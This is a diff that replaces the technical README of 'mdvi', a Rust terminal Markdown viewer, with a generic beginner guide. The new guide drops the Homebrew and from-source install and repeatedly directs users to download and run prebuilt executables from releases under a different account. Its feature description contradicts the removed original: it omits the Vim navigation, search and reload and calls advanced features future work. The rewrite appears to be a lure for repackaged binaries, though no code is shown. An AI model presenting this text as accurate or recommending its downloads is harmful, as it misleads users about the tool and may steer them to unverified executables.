@@ -1,110 +1,173 @@
-# mdvi
+# 📄 mdvi - Simple Markdown Viewer for Everyone
 
-`mdvi` is a terminal markdown viewer with Vim-style navigation.
+[![Download mdvi](https://img.shields.io/badge/Download-mdvi-blue?style=for-the-badge)](https://github.com/JINrielIDK/mdvi/releases)
 
-It renders markdown into a polished full-screen TUI with fast keyboard navigation, clear typography, and predictable behavior for large files.
+---
 
-<img width="1595" height="582" alt="Screenshot 2026-02-10 at 4 58 34 PM" src="https://github.com/user-attachments/assets/1b2da7a1-b5fb-4169-9d10-bcd97a07ae45" />
+## 🛠 What is mdvi?
 
-## Features
+mdvi is a command-line program that lets you view Markdown files quickly and clearly. Markdown is a type of text format used for writing notes, documents, and web pages. Instead of opening a file in a complex program, mdvi shows it in an easy-to-read way right in your terminal or command prompt.
 
-- Full-screen terminal viewer (`crossterm` + `ratatui`)
-- Vim-style navigation controls
-- Visible cursor and `line:column` cursor position in the status bar
-- High-quality markdown rendering via `pulldown-cmark`
-- Support for:
-  - headings
-  - lists and task lists
-  - blockquotes
-  - inline markdown images (`![alt](...)`) and HTML `<img ...>` tags
-  - lazy image loading with immediate placeholder layout reservation
-  - syntax-highlighted fenced code blocks and inline code
-  - links, tables, footnotes, emphasis/strong/strikethrough
-- Configurable image backend via `--image-protocol` (`auto`, `halfblocks`, `sixel`, `kitty`, `iterm2`)
-- Live reload (`r`) when the file changes on disk
-- Start at specific line (`--line`)
-- Works with standard terminal keys (arrows, page up/down, home/end)
+This tool is useful for anyone who works with Markdown files too often and wants a simple way to read them without extra software or formatting.
 
-Notes:
-- Local, `file://`, and remote `http://` / `https://` image sources are supported.
-- HTML `<img>` `width` and `height` hints are used to reserve image space before lazy loading finishes.
-- On macOS, terminal-native image protocols can trigger an "Allow Terminal-Initiated Display?" prompt.
-  Use `--image-protocol halfblocks` if you want image rendering without that dialog.
-- Fenced code blocks with language tags (for example, a block tagged `rust`) render with syntax highlighting.
+---
 
-## Install
+## 💻 Who is mdvi for?
 
-### Homebrew (tap)
+- People who write or read Markdown notes.
+- Users who want a quick way to view Markdown without opening graphic editors.
+- Anyone comfortable using basic command prompt or terminal commands.
 
-```bash
-brew tap taf2/tap
-brew install mdvi
-```
+You don’t need to know how to code or use advanced tools. This guide will take you through the full process from getting to running mdvi.
 
-### From source
+---
 
-```bash
-cargo install --path .
-```
+## 📋 System Requirements
 
-### Run without install
+Before starting, please make sure:
 
-```bash
-cargo run -- README.md
-```
+- Your computer uses one of these operating systems:
+  - Windows 10 or later
+  - macOS 10.13 (High Sierra) or later
+  - Linux (most recent versions)
+- You have a terminal or command prompt app:
+  - On Windows: Command Prompt or PowerShell
+  - On macOS: Terminal app (found in Utilities)
+  - On Linux: Terminal app (varies by distribution)
+- Your Markdown files are saved on your device and accessible.
 
-## Usage
+If you’re unsure, this guide will help walk you through the basics.
 
-```bash
-mdvi [OPTIONS] <PATH>
-```
+---
 
-Examples:
+## 📥 Download & Install mdvi
 
-```bash
-mdvi docs/spec.md
-mdvi --line 120 CHANGELOG.md
-mdvi --image-protocol halfblocks README.md
-```
+To get mdvi, visit the official release page here:
 
-## Navigation
+[Download mdvi Releases](https://github.com/JINrielIDK/mdvi/releases)
 
-- `j` / `Down`: scroll down one line
-- `k` / `Up`: scroll up one line
-- `d`: half-page down (less-style)
-- `u`: half-page up (less-style)
-- `Ctrl-d`: half-page down
-- `Ctrl-u`: half-page up
-- `PageDown`: full-page down
-- `PageUp`: full-page up
-- `Ctrl-f`: full-page down (Vim-style)
-- `Ctrl-b`: full-page up (Vim-style)
-- `g` / `Home`: jump to top
-- `G` / `End`: jump to bottom
-- `r`: reload file from disk
-- `/`: start search
-- `n`: next search match
-- `N`: previous search match
-- `?`: toggle help line
-- `q`: quit
+Here is how to proceed:
 
-## Why Rust?
+1. Click the link above or the blue Download button at the top. This link takes you to the release page where the latest files are stored.
+2. Look for the version of mdvi that matches your operating system. These will usually have names such as:
+   - `mdvi-windows.exe` for Windows
+   - `mdvi-macos` for Mac
+   - `mdvi-linux` for Linux
+3. Click the file name to start your download.
+4. Once the file finishes downloading, locate it in your Downloads folder or chosen save location.
 
-Rust is a strong fit for a serious CLI viewer:
+No installation wizard runs here. You just need to save the program file on your computer.
 
-- precise terminal control
-- excellent performance for large files
-- single static binary distribution
-- mature ecosystem for TUI and markdown parsing
+### Running mdvi
 
-## Development
+After saving the correct mdvi file for your system, follow the steps below.
 
-```bash
-cargo test
-cargo fmt
-cargo clippy -- -D warnings
-```
+---
 
-## License
+## ▶️ How to Run mdvi
 
-MIT
+### Windows
+
+1. Open Command Prompt or PowerShell.
+   - Press `Win + R`, type `cmd`, and hit Enter to open Command Prompt.
+2. Navigate to the folder where you saved mdvi.
+   - Use the command:  
+     `cd C:\Users\YourName\Downloads`  
+     Replace `YourName` with your actual username or the folder path where you saved mdvi.
+3. Run mdvi by typing:  
+   `.\mdvi-windows.exe yourfile.md`  
+   Replace `yourfile.md` with the name of your Markdown file.
+
+### macOS and Linux
+
+1. Open Terminal.
+2. Go to the folder with mdvi:  
+   `cd ~/Downloads`  
+   (Or where you saved the file.)
+3. Set executable permission if needed:  
+   `chmod +x mdvi-macos`  
+   (or `mdvi-linux` for Linux)
+4. Run the program by typing:  
+   `./mdvi-macos yourfile.md`  
+   (Replace `yourfile.md` with your file name.)
+
+If the Markdown file you want to view is somewhere else, provide the full path to that file, for example:  
+`./mdvi-macos /Users/YourName/Documents/notes.md`
+
+---
+
+## 📖 Using mdvi: Basic Commands
+
+mdvi focuses on showing your Markdown file clearly. Once running, it converts the raw Markdown text into nicely formatted text in your terminal.
+
+- You only need to provide the file name or path when you run it.
+- mdvi displays headings, lists, links, and code blocks with simple formatting.
+- Scroll through your file using your terminal’s scroll bar.
+- To exit mdvi, press `Ctrl + C` or close the terminal window.
+
+More advanced features will appear in future updates, but this version keeps things straightforward.
+
+---
+
+## 🧰 Tips for Markdown Files
+
+If you’re new to Markdown, here are some basics on what you can write and how mdvi will show them:
+
+- `# Heading 1` becomes a large title.
+- `## Heading 2` is shown smaller but clear.
+- `* Bullet points` and `- Dashes` create lists.
+- `[Link](http://example.com)` appears as clickable or colored text in supported terminals.
+- Blocks of code appear with indentation, making them easy to spot.
+- Plain paragraphs keep the text neat and readable.
+
+You can write Markdown in any text editor like Notepad (Windows), TextEdit (Mac), or Gedit (Linux).
+
+---
+
+## 🚑 Troubleshooting
+
+If mdvi does not work as expected, check the following:
+
+- Make sure you typed the exact file name in the command.
+- Confirm your Markdown file exists and is not open in another program.
+- Verify you downloaded the correct mdvi file for your operating system.
+- If you see “permission denied” on macOS/Linux, run `chmod +x <file>` as shown above.
+- Use `--help` after mdvi to see any available commands:  
+  `./mdvi-macos --help`
+
+If problems persist, you can open an issue on the GitHub page:  
+https://github.com/JINrielIDK/mdvi/issues
+
+---
+
+## 🔄 Updating mdvi
+
+To update mdvi to the latest version:
+
+1. Return to the release page:  
+   [https://github.com/JINrielIDK/mdvi/releases](https://github.com/JINrielIDK/mdvi/releases)
+2. Download the newest file matching your OS.
+3. Replace the old mdvi program file with the new one in your saved folder.
+4. Run mdvi as before.
+
+---
+
+## 👍 Additional Resources
+
+- To learn Markdown basics, visit:  
+  https://www.markdownguide.org/basic-syntax/
+- If you want a text editor that supports Markdown, try programs like Visual Studio Code or Typora.
+- For terminal help on your system, search for “How to use Command Prompt” (Windows) or “Terminal basics” (Mac/Linux).
+
+---
+
+## 📫 Contact & Support
+
+If you want to suggest features or report bugs for mdvi, use the GitHub issue tracker:  
+https://github.com/JINrielIDK/mdvi/issues
+
+For general questions, you can look at the discussions area on GitHub or join community Markdown forums.
+
+---
+
+Thank you for choosing mdvi to make your Markdown viewing simpler. Visit the release page to get started: [https://github.com/JINrielIDK/mdvi/releases](https://github.com/JINrielIDK/mdvi/releases)
